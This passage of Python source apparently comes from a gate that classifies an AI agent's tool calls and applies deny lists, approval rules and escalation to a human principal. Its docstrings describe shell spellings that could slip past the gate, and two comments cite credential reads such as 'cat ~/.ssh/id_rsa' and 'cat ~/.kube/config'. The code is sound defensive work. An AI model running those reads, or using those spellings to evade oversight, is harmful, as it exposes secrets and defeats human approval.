    if read is not None:                        # the target: the name in the folder it resolves into a store from
        where = folders[0][0] if len(folders) == 1 else " or ".join(f for f, _ in folders)
        paths = [_in_folder(_expand_text(f), read.target) for f, _ in folders]
        linked = [_in_folder(g, read.target) for f, g in forms if g != f]   # `..` read past the link, as the kernel
        cds = [f"cd {raw}" for _, raw in folders]
        out.append((f"{read.summary} in {where}",
                    next((p for p in linked + paths if is_sensitive_path(p)), paths[0]),
                    cds[0] if len(cds) == 1 else " or ".join(cds)))
    cmds, subs, _ = _parse(cmd or "")           # #320: also beside ``read``, which only its forms may have made
    walked: list = []
    for wide in (False, True):                  # main's reading first, #320's beside it
        for f, g in forms:
            if found := _cd_store_read(cmds, subs, wide, walked, tools=(g,)):
                target = _in_folder(_expand_text(g), found)
                if all(target != t for _, t, *_ in out):
                    out.append((f"shell touching {found} in {f}", target, f"cd {spell[f]}"))
                break
    return out


def _in_folder(folder: str, name: str) -> str:
    """The path a relative ``name`` read in ``folder`` stands for; the folder when there is no name."""
    if not name or name == _TOO_MANY:
        return folder
    return name if name.startswith(("/", "~", "$")) else os.path.normpath(os.path.join(folder, name))


def _repo_claude(folder: str) -> bool:
    """A folder in a repo's own `.claude` worktrees, commands, agents or skills, and below no other store, as the
    search tools judge it (StoreSkip, #241): a checkout at <repo>/.claude/worktrees/x holds the repo's files. A
    store folder by its name below that (`x/.kube`, `x/.config/gh`, _store_hints) is read as a `cd` there is."""
    try:
        p = os.path.normpath(os.path.abspath(folder))
        parts = p.split(os.sep)
        if ".claude" not in parts:
            return False
        skip = StoreSkip(p)
        if not skip._project_claude(p + "/x") or skip._hit(p + "/x"):
            return False
    except (OSError, ValueError):               # a NUL in it, or the gate's own folder is gone: not the repo's
        return False
    n = len(parts) - parts[::-1].index(".claude") + 1       # the first part below .claude/<worktrees...>
    singles, pairs, _ = _store_hints()
    return not any(_fold(s) in singles or (_fold(a), _fold(s)) in pairs for a, s in zip(parts[n - 1:], parts[n:]))


def _store_part(path: str, summary: str) -> Classification:
    """The store write part of a file tool that also names a secret (#447): the call stays credentials, and
    call_approvers reads the part, so only the principal answers it, as for `cat ~/.ssh/id_rsa > <store file>`."""
    c = _make("store_write", summary=summary[:120], target=path, link=path)
    c.signals.append("exo store")
    return c


def _joined_call(action: Any) -> tuple[str, dict] | None:
    """A shell call with its line joined (_join_dollars), for classify's joined reading (#584); None for any other
    call, and inside a classify that already reads one."""
    try:
        tool, args = _args_of(action)
    except (TypeError, ValueError):
        return None
    key = "command" if args.get("command") else "cmd"
    line = args.get(key)
    if _joining.get() is not None or not _runs_shell(tool, args) or not isinstance(line, str):
        return None
    return tool, {**args, key: _join_dollars(line)}


def classify(action: Any, cwd: str | None = None) -> Classification:
    """Classify one tool call from its name and arguments (_split_reading, _classify_reading). Pure; never raises on
    odd args. #471: a call that reads a quoted prefix assignment as one (`X='a b' cmd`) is also read as before, with
    the word as the program, in a call of its own (``before``): what that reading changes for the commands after it
    (a `cd`, a `coproc`) then leaves the line as before, and decide keeps the stricter of the two. Each of the two is
    read with its `env -S` texts as _split_reading reads them (#591), so the reading as before is the call as read
    before #471, `env -S` readings (``split_readings``) and all."""
    seen = [False]
    token = _quoted_seen.set(seen)
    try:
        c = _split_reading(action, cwd)
    finally:
        _quoted_seen.reset(token)
    if seen[0]:
        token2 = _as_before.set(True)
        try:
            c.before = _split_reading(action, cwd)
        finally:
            _as_before.reset(token2)
    return c


def _split_reading(action: Any, cwd: str | None = None) -> Classification:
    """One reading of the quoted prefix assignments (classify, #471), with its `env -S` texts read each way (#591).
    Its first reading reads each `env -S` text, beside the text as a shell line, as the line env runs (#591 follow-up
    to #634, _env_split_lines), and a spelling main missed (`--split`, `-i0vS`) as `-S TEXT` (_env_s_text). Where it
    read a line or such a spelling, the call is read again with each text a shell line only: with #634's reading of
    the text's leading words (_env_split_argv), as main read it (mode 1), also where only a reading as main's found
    one (a nested text a missed spelling hid, verify 2 of #707); as before #634 (mode 0); and with every spelling
    read as `-S TEXT` (mode 3). Each is a call of its own, in ``split_readings`` with main's first (the hook's bypass
    keeps main's order with it), so a part that leads one reading or takes an ssh hop's host there keeps it (review
    of #634), and decide keeps the strictest. Each of those readings is read the way the lexer reads a ${..} word
    and a $(( now and, where that may differ from the reading before #143, that way too (_classify_reading, #158)."""
    if _env_split_mode.get() is not None:      # a reading inside a reading (D-074's ordinary): the same mode
        return _classify_reading(action, cwd)
    mark: list[int] = [0]
    token = _env_split_mode.set((2, mark))
    try:
        c = _classify_reading(action, cwd)
    finally:
        _env_split_mode.reset(token)
    if mark[0] & 1:     # main's reading whenever any is taken: a text read here can hide a nested one main read
        mark[0] |= 2
    for mode in (1, 0, 3):                      # main's reading first: split_readings[0] when any is taken
        if mark[0] & (1 << mode):
            token = _env_split_mode.set((mode, [0]))
            try:
                c.split_readings.append(_classify_reading(action, cwd))
            finally:
                _env_split_mode.reset(token)
    return c


def _classify_reading(action: Any, cwd: str | None = None) -> Classification:
    """Classify one tool call in one reading of its `env -S` texts (classify), as the lexer reads it now
    (_classify_read). Where the lexer's reading of a ${..} word or a $(( may differ from the one before #143 anywhere
    in the call (_two_ways), the call is also read that way in the same `env -S` reading, with budgets of its own, at
    the end of its chain of ``also`` readings, and decide keeps the stricter (#143, #553). So each `env -S` reading
    keeps both, and a word in an `env -S` text, a sudo -s or -i shell's stdin (#491) or a joined line (#584) is read
    both ways too."""
    if _two_ways.get() is not None or _flat_words.get():
        return _classify_read(action, cwd)
    flag = _two_ways.set([False])
    try:
        c = _classify_read(action, cwd)
        two = (_two_ways.get() or [False])[0]
    finally:
        _two_ways.reset(flag)
    if two:
        flat = _flat_words.set(True)
        try:
            before = _classify_read(action, cwd)
        finally:
            _flat_words.reset(flat)
        last = c
        while last.also is not None:
            last = last.also
        last.also = c.flat = before
    return c


@_brace_budget
@_in_tool_folder
def _classify_read(action: Any, cwd: str | None = None) -> Classification:
    """One reading of the call (_classify_reading), in one reading of its quoted prefix assignments (#471, classify)
    and of its `env -S` texts (_split_reading), with its own budgets: as the lexer reads now, or as before #143
    (_flat_words). When a gh command in it has its subcommand past an option (_gh_verb_order), or a gh api method gh
    reads otherwise (_gh_api_method), the call is also read as before #399, with each gh command's third word for
    its subcommand, and that reading is its ``floor``. A shell line with a `$` form split by a backslash-newline,
    there or in a line read again from it, is also read with each one joined, as bash reads it (#584), with budgets
    of its own. The more severe of that reading and the line as read before leads, and the other ends its ``also``
    readings, so decide keeps the stricter. When the Exo home's config.json counted as the store, or an exo command
    that writes it ran (D-074), the call is also read as before D-074, as a call of its own, and that reading is its
    ``ordinary``.
    A generic camelCase tool also keeps its complete unsplit-name classification as a ``floor`` (#515). When the gate
    reads what a sudo -s or -i shell runs (#491), each reading is also read as before, and that reading ends its
    chain of floors (readings), so decide never goes below it. A line with a compound command behind a pipeline
    prefix (`time`, `time -p`, `!` ..) is also read with the compound opened (#853, _opened_reading); the
    ``ordinary`` reading (D-074) of a call is not opened there, as the opened reading reads its own. ``cwd`` is
    the folder the tool runs in, when the caller knows it: relative paths are resolved from there too
    (_in_tool_folder sets it)."""
    timed = [False]
    met = _timed.set(timed)
    try:
        c = _one_reading(action, cwd)
    finally:
        _timed.reset(met)
    return _opened_reading(c, action, cwd) if timed[0] and not _opening.get() and not _config_off.get() else c


def _opened_reading(c: Classification, action: Any, cwd: str | None) -> Classification:
    """#853: the call as read before (c), with a second reading of it beside it in which each compound command
    behind bash's pipeline prefixes (`time`, `time -p`, `time --`, `time -p --`, `!` and their combinations, _parse_line)
    is read as the same compound without them: its parts, their categories, and #479's second pass of a loop that
    `cd`s into a store folder (_loop_reading). The reading has budgets and memos of its own. The reading as before
    stays as it is, with its ``ordinary`` reading (D-074) beside the second reading's, each read once (the reading
    as before reads its own without opening it, _classify_read): decide keeps the strictest, and no_grant (and
    through it the hook's bypass floor) counts each reading, so a line never decides lower than before."""
    left, memo = _brace_left.set(None), _shell_seen.set(None)
    token, met = _opening.set(True), _timed.set(None)
    try:
        x = _brace_budget(_one_reading)(action, cwd)
    finally:
        _timed.reset(met)
        _opening.reset(token)
        _shell_seen.reset(memo)
        _brace_left.reset(left)
    o, xo = c.ordinary, x.ordinary
    c = _beside(c, x)
    c.ordinary = xo if o is None else o if xo is None else _beside(o, xo)
    return c


def _one_reading(action: Any, cwd: str | None = None) -> Classification:
    """_classify_read's reading of the call, in its budgets and folders: the call, its joined reading (#584) and
    its loops' second passes (#479)."""
    call = _joined_call(action)                                     # (#584) the same call with its $ forms joined
    seen = [False, False]
    loops: list[int] = [False, False, 0]                            # (#479) a loop with a `cd` into the store
    token, noted = _joining.set(seen), _loop_pass.set(loops)
    try:
        c = _read_core(action, cwd)
    finally:
        _loop_pass.reset(noted)
        _joining.reset(token)
    if seen[1] and call is not None:
        left, memo, token = _brace_left.set(None), _shell_seen.set(None), _joining.set([True, False])
        noted = _loop_pass.set(loops)
        try:
            j = _brace_budget(_read_core)(call, cwd)                # joined reading of the same call (#584)
        finally:
            _loop_pass.reset(noted)
            _joining.reset(token)
            _shell_seen.reset(memo)
            _brace_left.reset(left)
        c = _beside(c, j)
    if loops[1]:
        c = _loop_reading(c, [action] + ([call] if seen[1] and call is not None else []), cwd,
                          _LOOP_BUDGET + loops[2])
    return c


def _beside(c: Classification, j: Classification) -> Classification:
    """Readings c and j of one call: the more severe leads (on a tie, c), and the other ends its ``also`` readings,
    so decide keeps the stricter (#584)."""
    first, last = (j, c) if _severity(j) > _severity(c) else (c, j)
    x = first
    while x.also is not None:
        x = x.also
    x.also = last
    return first


def _loop_reading(c: Classification, calls: list, cwd: str | None, budget: int) -> Classification:
    """#479: the call read as before (c), with a second reading of each of ``calls`` (the call, and its joined form
    when classify read one, #584) beside it, in which each loop that holds a `cd` into a store folder also has the
    parts of its second pass (_loop_again). Each reading has budgets and memos of its own. A reading that adds no
    part is left out. The reading as before stays as it is: decide keeps the strictest, so a line never decides
    lower. When the second reading leads, it keeps the D-074 ``ordinary`` reading the reading as before had.
    A second reading that reads afresh more lines than ``budget`` (_LOOP_BUDGET, #479 verify) fails closed: in its
    place is one store write that stands for the passes it did not read, which asks the principal alone and denies
    under `deny: [store_write]`."""
    for n, call in enumerate(calls):
        added: list[int] = [True, False, budget]
        left, memo = _brace_left.set(None), _shell_seen.set(None)
        token, again = _joining.set([n > 0, False]), _loop_pass.set(added)
        try:
            x = _brace_budget(_read_core)(call, cwd)
        except _LoopBudget:
            x = _make("store_write", tool=c.tool, command=c.command, own=None,
                      target="a path inside the store (after cd)",
                      summary="a loop that enters the Exo store runs again there; past the gate's budget, not read")
            x.signals += ["exo store", "unread loop pass"]
            added[1], added[2] = True, -1
        finally:
            _loop_pass.reset(again)
            _joining.reset(token)
            _shell_seen.reset(memo)
            _brace_left.reset(left)
        if added[1]:
            if x.ordinary is None:
                x.ordinary = c.ordinary
            c = _beside(c, x)
        if added[2] < 0:
            break                                  # its joined form has the same loops: one such reading is enough
    return c


def _read_core(action: Any, cwd: str | None = None) -> Classification:
    """The body classify reads the call with: the gh ``floor``, the reading as before #491 at the end of the floors
    when a sudo -s or -i shell's stdin was read, and the D-074 ``ordinary`` reading of a call whose config.json the
    store counted, each with the call's own budgets, memos and folders. The join context is set by classify, also for
    its joined reading; _read_core leaves it alone."""
    memo, mark = _call_memo.get(), [False]
    if memo is not None:
        memo.pop(_SUDO_READ, None)
    marked = _config_mark.set(mark)
    try:
        c = _classify_call(action)
        if memo is not None and memo.pop(_GH_MOVED, False) and not _gh_third_word.get():
            third = _gh_third_word.set(True)
            try:
                c.floor = _classify_call(action)
            finally:
                _gh_third_word.reset(third)
    finally:
        _config_mark.reset(marked)
    if memo is not None and memo.pop(_SUDO_READ, False) and not _sudo_shell_off.get():
        off, left, seen = _sudo_shell_off.set(True), _brace_left.set(None), _shell_seen.set(None)
        try:
            last = c
            while last.floor is not None:
                last = last.floor
            last.floor = _brace_budget(_read_core)(action, cwd)     # the reading as before #491, its own budgets
        finally:
            _shell_seen.reset(seen)
            _brace_left.reset(left)
            _sudo_shell_off.reset(off)
    if mark[0]:
        off, left, seen = _config_off.set(True), _brace_left.set(None), _shell_seen.set(None)
        try:
            c.ordinary = classify(action, cwd)      # its own budgets, memos and folders (_brace_budget, _in_tool_folder)
        finally:
            _shell_seen.reset(seen)
            _brace_left.reset(left)
            _config_off.reset(off)
    return c


def _classify_call(action: Any, *, legacy_name: bool = False) -> Classification:
    tool, args = _args_of(action)
    if _runs_shell(tool, args):
        c = _shell_call(str(args.get("command") or args.get("cmd") or ""))
    elif tool == "execute_code":
        c = classify_code(str(args.get("code") or ""))
    elif (tool == "work_notes" and args.get("action") in ("read", "history", "update")
          and set(args) <= {"read": {"action", "revision"}, "history": {"action", "limit"},
                            "update": {"action", "expected_revision", "document"}}[args["action"]]):
        operation = args.get("action")
        category = "local_write" if operation == "update" else "read"
        c = _make(category, summary=f"session working notes: {operation}")
    elif tool in ("write_file", "patch", "edit_file", "apply_patch"):
        paths = [_first(args, ("path", "file_path"))] + _patch_paths(str(args.get("patch") or ""))
        paths = [p for p in paths if p]
        path = next((p for p in paths if is_sensitive_path(p)), "") or args_sensitive(args)
        cat = "credentials"
        if not path:
            path = next((p for p in paths if is_store_path(p, from_cwd=True)), "")
            cat = "store_write" if path else "local_write"
        path = path or (paths[0] if paths else "")
        c = _make(cat, summary=f"write {path}", target=path, link=path)
        if cat == "store_write":
            c.signals.append("exo store")
        # #448: each file it writes stays a part, so its deny, reserved and matrix entries apply. A local write of more
        # than one file too, so an exact target entry reaches a path that only the reading on one line found (#559).
        if cat != "local_write" or len(set(paths)) > 1:
            c.parts = [_make("local_write", summary=f"write {p}", target=p, link=p)
                       for p in dict.fromkeys(paths or [path])]
        # #447: a store file it writes beside a secret is a part, so only the principal answers. #514: so is each store
        # file past the first, so a target entry on any of them matches, as for the other file tools.
        if cat != "local_write":
            c.parts += [_store_part(p, f"write {p}") for p in dict.fromkeys(paths)
                        if (cat == "credentials" or p != path) and is_store_path(p, from_cwd=True)]
    elif tool == "web_extract":
        urls = args.get("urls") or [args.get("url", "")]
        url = urls[0] if isinstance(urls, list) and urls else str(urls)
        c = _make("web_read", summary=f"read {url}", target=_host_of(str(url)), link=str(url))
    elif tool == "send_message":
        target = _first(args, ("target", "chat_id", "channel"))
        c = _make("message_send", summary=f"send message to {target or 'a chat'}", target=target,
                  text=_first(args, ("message", "text")))
        if str(args.get("action", "send")).lower() == "list":
            c = _make("read", summary="list message targets")
    elif tool == "cronjob_manage":
        action = str(args.get("action", "")).lower()
        if action in ("list", "get", "status", ""):
            c = _make("read", tool=tool, summary=f"cron {action}")
        else:
            operation = json.dumps(args, sort_keys=True, ensure_ascii=False, default=str)
            c = _opaque(f"cronjob_manage mutation: {action}", operation)
            c.tool = tool
    else:
        old_tokens = [p for p in re.split(r"[_\-.:/]+", tool.lower()) if p]
        cat = own = TOOLS.get(tool) or (_classify_name_tokens(old_tokens) if legacy_name else classify_by_name(tool))
        secret = args_sensitive(args) if cat in ("read", "local_write", "unknown", "remote_write", "delete") else ""
        if secret:
            cat = "credentials"
        stores: list[str] = []
        # A tool named with a read verb that writes what it took where its path arguments say (`download_file`)
        # reads the store as a write's too (#494); a name that says it replaces, patches or edits the file counts
        # with them, and so do arguments that carry the old and new text beside a path (#651): a `search_replace`
        # or `find_and_replace` of the seat, a policy file or config.json writes it, as `write_file` does. A plain
        # read of the store stays a read.
        fetch = own in ("read", "web_read") and (not _FETCH_WRITE_WORDS.isdisjoint(_name_tokens(_CAMEL.sub("_", tool)))
                                                 or _replace_args(args))
        if own not in ("read", "web_read") or fetch:
            # A delete reaches the store through a folder that holds it, as `rm` does, and so does a move or
            # rename, as `mv` does, with or without a secret beside it (#494). A tool whose camelCase name says so
            # counts too (#447).
            wide = own == "delete" or not _WIDE_WORDS.isdisjoint(_name_tokens(_CAMEL.sub("_", tool)))
            named = [v for k in _PATH_ARG_KEYS for v in (args.get(k) if isinstance(args.get(k), (list, tuple))
                     else [args.get(k)]) if isinstance(v, str)]
            stores = list(dict.fromkeys(v for v in named if is_store_path(v, ancestors=wide, from_cwd=True)))
            if stores and not secret and (cat in ("local_write", "delete") or fetch):
                cat = "store_write"
        store = stores[0] if stores and not secret else ""
        target = _first(args, _TARGET_KEYS)
        text = _first(args, _TEXT_KEYS) if cat in OUTBOUND else ""
        title = _first(args, _TITLE_KEYS) if cat in OUTBOUND else ""
        cost: float | None = 0.0
        if cat == "payment":
            amt = _first(args, _AMOUNT_KEYS)
            try:
                cost = float(re.sub(r"[^\d.]", "", amt)) if amt else None
            except ValueError:
                cost = None
        link = target if target.startswith(("http://", "https://", "/", "~")) else ""
        c = _make(cat, summary=f"{tool} {target}".strip()[:120], target=target, link=link, text=text,
                  title=title, cost=cost)
        if cat == "unknown":
            c.signals.append("unrecognised tool")
        if secret:
            c.signals.append("secret store")
            c.summary, c.target = f"{tool} {secret}"[:120], secret
        if store and cat != "store_write":
            # #435: a call that does not write files (a post, an upload, a payment) and names a store path takes it
            # as a source. It is a store write, and keeps the call as a part, with its target and text, so a deny,
            # rule, matrix cell or posting rule on that call still holds (D-075, #191, #396).
            c.tool = tool
            _local_post(c)
            c = _make("store_write", link=link, parts=[c])
        if store:
            c.signals.append("exo store")
            c.summary, c.target = f"{tool} {store}"[:120], store
        if cat != own:  # #448: the tool's own reading stays a part, so its deny, reserved and matrix entries apply
            out = own in OUTBOUND
            c.parts = [_make(own, summary=f"{tool} {target}".strip()[:120], target=target, link=link,
                             text=_first(args, _TEXT_KEYS) if out else "", title=_first(args, _TITLE_KEYS) if out else "")]
        # #514: the store paths the tool names beyond the first are store write parts, each with its path as
        # target, as they all are beside a secret (#447): a target entry on any of them matches, whatever path
        # the scan met first. The first path is the call's own target, as before.
        c.parts += [_store_part(p, f"{tool} {p}") for p in (stores if secret else stores[1:])]
        # Keep the complete unsplit reading, including argument checks and outbound metadata. New name words
        # must not lower an old secret/store floor, category policy or posting rule (#515).
        if not legacy_name and tool not in TOOLS and _CAMEL.search(tool):
            c.floor = _classify_call(action, legacy_name=True)
    for r in readings(c):
        r.tool = tool
        _local_post(r)
    return c


def _local_post(c: Classification) -> None:
    """A web post or read to a local host is private and no third party."""
    if c.category in ("web_post", "web_read") and c.target and _is_local_host(c.target):
        c.exposure, c.third_party = "private", False


# --- policies ------------------------------------------------------------------------------

DEFAULT_MATRIX = {
    "reversible": {"private": "allow", "internal": "allow", "public": "ask"},
    "costly": {"private": "allow", "internal": "log", "public": "ask"},
    "irreversible": {"private": "ask", "internal": "ask", "public": "ask"},
}

DEFAULT_POLICIES: dict = {
    "gates": {"matrix": DEFAULT_MATRIX, "scopes": {"private": [], "internal": []}, "categories": {},
              "rules": [], "reserved": [], "deny": [],
              "escalate": {"cost_over_budget": True, "third_party": True, "categories": ["credentials", "account",
                                                                                        "payment"]},
              "ask_default": "skip"},
    "budget": {"per_action_max": 0, "per_day_max": 0, "per_month_ceiling": 0},
    "posting": {"applies_to": list(POSTING_DEFAULT), "footer": "", "forbid": [], "forbid_words": [],
                "forbid_agent_names": False},
    "agents": [],
}


def _norm_outcome(v: Any, where: str) -> str:
    out = _OUTCOME_ALIASES.get(str(v).strip().lower())
    if out is None:
        raise PolicyError(f"{where}: unknown decision {v!r}; expected one of act, report, allow, log, ask, deny")
    return out


def normalize_policies(raw: Mapping | None, errors: list[str] | None = None) -> dict:
    """Fill defaults and check types. Raises PolicyError on a bad value. Given ``errors``, a malformed
    ``gates.escalate`` is recorded there instead and only that section is repaired (#557). A pattern a
    decision runs that does not compile is refused either way (#466, check_patterns)."""
    raw = dict(raw or {})
    pol = json.loads(json.dumps(DEFAULT_POLICIES))
    gates = dict(raw.get("gates") or {})
    matrix = gates.get("matrix") or {}
    for rev in REVERSIBILITY:
        for exp in EXPOSURE:
            v = (matrix.get(rev) or {}).get(exp)
            if v is not None:
                pol["gates"]["matrix"][rev][exp] = _norm_outcome(v, f"gates.matrix.{rev}.{exp}")
    scopes = gates.get("scopes") or {}
    for k in ("private", "internal"):
        v = scopes.get(k) or []
        if not isinstance(v, list):
            raise PolicyError(f"gates.scopes.{k} must be a list")
        pol["gates"]["scopes"][k] = [str(x) for x in v]
    cats = gates.get("categories") or {}
    if not isinstance(cats, Mapping):
        raise PolicyError("gates.categories must be a mapping of category: decision")
    pol["gates"]["categories"] = {str(k): _norm_outcome(v, f"gates.categories.{k}") for k, v in cats.items()}
    rules = gates.get("rules") or []
    if not isinstance(rules, list):
        raise PolicyError("gates.rules must be a list")
    out_rules = []
    for i, r in enumerate(rules):
        if not isinstance(r, Mapping) or "decision" not in r:
            raise PolicyError(f"gates.rules[{i}] needs a decision")
        match = r.get("match") or {k: v for k, v in r.items() if k not in ("decision", "reason", "name")}
        out_rules.append({"match": dict(match), "decision": _norm_outcome(r["decision"], f"gates.rules[{i}]"),
                          "reason": str(r.get("reason") or r.get("name") or f"rule {i + 1}")})
    pol["gates"]["rules"] = out_rules
    for k in ("reserved", "deny"):
        v = gates.get(k) or []
        if not isinstance(v, list):
            raise PolicyError(f"gates.{k} must be a list")
        pol["gates"][k] = v
    if "escalate" in gates:
        esc, bad = gates["escalate"], ""
        if not isinstance(esc, Mapping):
            esc, bad = {"categories": esc if isinstance(esc, (list, str)) else []}, "gates.escalate must be a mapping"
        elif "categories" in esc and not isinstance(esc["categories"], list):
            bad = "gates.escalate.categories must be a list"
        if bad:
            if errors is None:
                raise PolicyError(bad)
            # #557: the default escalation plus each category the value names (as a string named them before #542)
            errors.append(bad)
            v = esc.get("categories")
            names = (v if isinstance(v, list) else list(v) if isinstance(v, Mapping)
                     else [c for c in CATEGORIES if c in v] if isinstance(v, str) else [])
            esc = {**esc, "categories": list(dict.fromkeys(pol["gates"]["escalate"]["categories"]
                                                            + [str(n) for n in names]))}
        pol["gates"]["escalate"].update(esc)
    if gates.get("ask_default"):
        pol["gates"]["ask_default"] = str(gates["ask_default"])
    budget = raw.get("budget") or {}
    for k in ("per_action_max", "per_day_max", "per_month_ceiling"):
        if budget.get(k) is not None:
            try:
                pol["budget"][k] = float(budget[k])
            except (TypeError, ValueError):
                raise PolicyError(f"budget.{k} must be a number") from None
    for k, v in budget.items():
        pol["budget"].setdefault(k, v)
    posting = raw.get("posting") or {}
    for k, v in posting.items():
        pol["posting"][k] = v
    for k in ("forbid", "forbid_words", "applies_to"):
        if not isinstance(pol["posting"].get(k) or [], list):
            raise PolicyError(f"posting.{k} must be a list")
    pol["posting"]["footer"] = str(pol["posting"].get("footer") or "")
    pol["agents"] = [str(a) for a in (raw.get("agents") or [])]
    pol["approvals"] = normalize_approvals(raw.get("approvals"))  # D-033
    pol["scrub"] = normalize_scrub(pol["posting"].get("scrub"), raw.get("internal_names") or ())  # D-033
    if raw.get("interruptions"):
        pol["interruptions"] = raw["interruptions"]
    check_patterns(raw)      # a pattern that does not compile refuses the policy here (#466)
    pol["_normalized"] = True
    return pol


def _glob_any(value: str, patterns: Iterable[str]) -> bool:
    v = (value or "").lower()
    return bool(v) and any(fnmatch.fnmatchcase(v, str(p).lower()) for p in patterns)


def _as_list(v: Any) -> list:
    return v if isinstance(v, list) else [v]


_MATCH_KEYS = ("category", "tool", "target", "command", "exposure", "reversibility", "third_party")


def _check_pattern(pat: str, where: str, flags: int = 0) -> None:
    try:
        re.compile(pat, flags)
    except re.error as e:
        raise PolicyError(f"{where}: bad pattern {pat!r}: {e}") from None


def _check_match_patterns(match: Mapping, where: str) -> None:
    for p in _as_list(match.get("command", [])):
        _check_pattern(str(p), f"{where}.command")


def check_patterns(raw: Mapping | None) -> None:
    """Compile every pattern a decision runs, when the policy loads (#466): a rule's ``match.command``, a
    ``reserved`` or ``deny`` entry's ``command`` (a ``command:<regex>`` string or a mapping like a rule's
    match) and a ``posting.forbid`` pattern. Raises PolicyError naming the entry. One that does not
    compile used to raise re.PatternError at decide, where the hook's fallback runs a read call with no
    ask and its card offers "always"; refused here, the hook loads the defaults on the PolicyError."""
    gates = (raw or {}).get("gates") or {}
    rules = gates.get("rules")
    if isinstance(rules, list):
        for i, r in enumerate(rules):
            if not isinstance(r, Mapping):
                continue
            match = r.get("match") or {k: v for k, v in r.items() if k not in ("decision", "reason", "name")}
            if isinstance(match, Mapping):
                _check_match_patterns(match, f"gates.rules[{i}]")
    for k in ("reserved", "deny"):
        entries = gates.get(k)
        if not isinstance(entries, list):
            continue
        for i, e in enumerate(entries):
            if isinstance(e, Mapping):
                m = e["match"] if isinstance(e.get("match"), Mapping) else e
                if isinstance(m, Mapping):
                    _check_match_patterns({x: v for x, v in m.items() if x in _MATCH_KEYS}, f"gates.{k}[{i}]")
                continue
            kind, _, val = str(e).strip().partition(":")
            if kind == "command" and val.strip():
                _check_pattern(val.strip(), f"gates.{k}[{i}]")
    posting = (raw or {}).get("posting")
    forbid = posting.get("forbid") if isinstance(posting, Mapping) else None
    if isinstance(forbid, list):
        for i, f in enumerate(forbid):
            if isinstance(f, Mapping):
                pat = str(f.get("pattern", ""))
                if pat:
                    _check_pattern(pat, f"posting.forbid[{i}]", bool(f.get("ignore_case")) and re.I)


def _policy_command_view(command: str) -> str:
    """Decode literal shell words without turning word contents into shell syntax.

    This is an additional veto view, never an authorization view. Dynamic words stay
    opaque. Execution strings get their own views only through classify_shell recursion.
    """
    words = _words_only.set(True)          # a word that holds a part is dynamic, read or not
    try:
        tokens = _Lexer(command, scan=False).run()
    finally:
        _words_only.reset(words)
    rendered = []
    for kind, value in tokens:
        if kind == "w":
            if value.dynamic:
                rendered.append("\x00\x01\x00")   # no letters or operators; a real word escapes control characters
            elif not value.text:
                rendered.append("''")
            else:
                rendered.append("".join(
                    f"\\x{ord(ch):02x}" if ch.isspace() or ord(ch) < 32 or ch in "\\'\";&|()<>" else ch
                    for ch in value.text
                ))
        elif kind in ("op", "redir"):
            rendered.append(value)
        elif kind == "hd":
            rendered.append("\x00\x02\x00")   # the heredoc body, the same way
    return " ".join(rendered)


def _command_matches(pattern: str, c: Classification, *, veto: bool = False,
                     line: Callable[[str], bool] | None = None) -> bool:
    regex = re.compile(pattern)
    texts = [c.command or ""]
    if veto and line is not None:       # a part of a line: its own text, or any decoded view of the line (#136)
        return bool(regex.search(texts[0])) or line(pattern)
    if veto:
        texts.extend(c._command_views)
    return any(regex.search(text) for text in texts)


def _rule_matches(match: Mapping, c: Classification, *, veto: bool = False,
                  line: Callable[[str], bool] | None = None) -> bool:
    for k, want in match.items():
        if k == "category" and c.category not in [str(x) for x in _as_list(want)]:
            return False
        if k == "tool" and not _glob_any(c.tool, _as_list(want)):
            return False
        if k == "target" and not _glob_any(c.target, _as_list(want)):
            return False
        if k == "command" and not any(_command_matches(str(p), c, veto=veto, line=line) for p in _as_list(want)):
            return False
        if k == "exposure" and c.exposure not in _as_list(want):
            return False
        if k == "reversibility" and c.reversibility not in _as_list(want):
            return False
        if k == "third_party" and bool(want) != c.third_party:
            return False
        if k not in _MATCH_KEYS:
            return False      # unknown key: never match, so a typo cannot widen a rule
    return True


def _list_matches(entries: Iterable, c: Classification, line: Callable[[str], bool] | None = None) -> str:
    """Reserved/deny entries: a category name, `tool:<glob>`, `command:<regex>`, `target:<glob>`,
    or a mapping like a rule's match. Plain prose that matches none of these is ignored."""
    for e in entries:
        if isinstance(e, Mapping):
            # Only match keys count. Anything else (reason, name, decision, a note, a typo) is dropped, so it
            # widens a deny or reserved entry instead of voiding it: these lists only make a decision stricter.
            raw = e["match"] if isinstance(e.get("match"), Mapping) else e
            match = {k: v for k, v in raw.items() if k in _MATCH_KEYS}
            if e and _rule_matches(match, c, veto=True, line=line):
                return str(e.get("reason") or e.get("name") or e)
            continue
        s = str(e).strip()
        if s == c.category:
            return s
        kind, _, val = s.partition(":")
        if kind == "tool" and _glob_any(c.tool, [val.strip()]):
            return s
        if kind == "target" and _glob_any(c.target, [val.strip()]):
            return s
        if kind == "command" and val.strip() and _command_matches(val.strip(), c, veto=True, line=line):
            return s
    return ""


def _scoped(c: Classification, scopes: Mapping, tool: str = "", seen: dict | None = None) -> Classification:
    """``c`` with the principal's scopes applied, and the same for every simple command it was built from.
    A part carries the tool of the call it came in on, so a `tool:` entry matches it too. A part shared by
    several results (_shell_seen) is scoped once and stays shared."""
    seen = {} if seen is None else seen
    key = (id(c), tool)
    if key not in seen:
        exposure, third = apply_scopes(c, scopes)
        inner = c.tool or tool
        seen[key] = replace(c, exposure=exposure, third_party=third, tool=inner,
                            parts=[_scoped(p, scopes, inner, seen) for p in c.parts])
    return seen[key]


def _each_part(c: Classification) -> Iterator[Classification]:
    """The classification and every simple command it was built from, nested ones included, each once."""
    seen: set[int] = set()
    todo = [c]
    while todo:
        p = todo.pop()
        if id(p) in seen:
            continue
        seen.add(id(p))
        yield p
        todo.extend(reversed(p.parts))


def _line_matcher(c: Classification) -> Callable[[str], bool]:
    """Whether a `command` pattern matches any decoded view of the line (#136), each pattern run once."""
    views = list(dict.fromkeys(v for p in _each_part(c) for v in p._command_views))
    seen: dict[str, bool] = {}

    def line(pattern: str) -> bool:
        if pattern not in seen:
            regex = re.compile(pattern)
            seen[pattern] = any(regex.search(v) for v in views)
        return seen[pattern]
    return line


def _one_text(c: Classification) -> bool:
    """Whether no two parts of the line have different own texts (#394): a line of one simple command, beside the
    parts the gate made for it with no own text (a secret path it names in `cat ~/.kube/config`, a string literal in
    its code). The part the call's own folder added carries a `_StandIn` for `cd <folder>` among its setters (#516),
    so a line with it is not one text: the #394 pass runs, and a rule that would lower the line names the folder, as
    it names the `cd` in the cd form; naming the folder lifts no deny of the part's."""
    texts = {t for p in _each_part(c) for t in (p.own, *p.setters) if t is not None}
    return len(texts) < 2


def _line_own_test(c: Classification, pol: Mapping, ctx: Mapping) -> Callable[[str, list[str]], bool]:
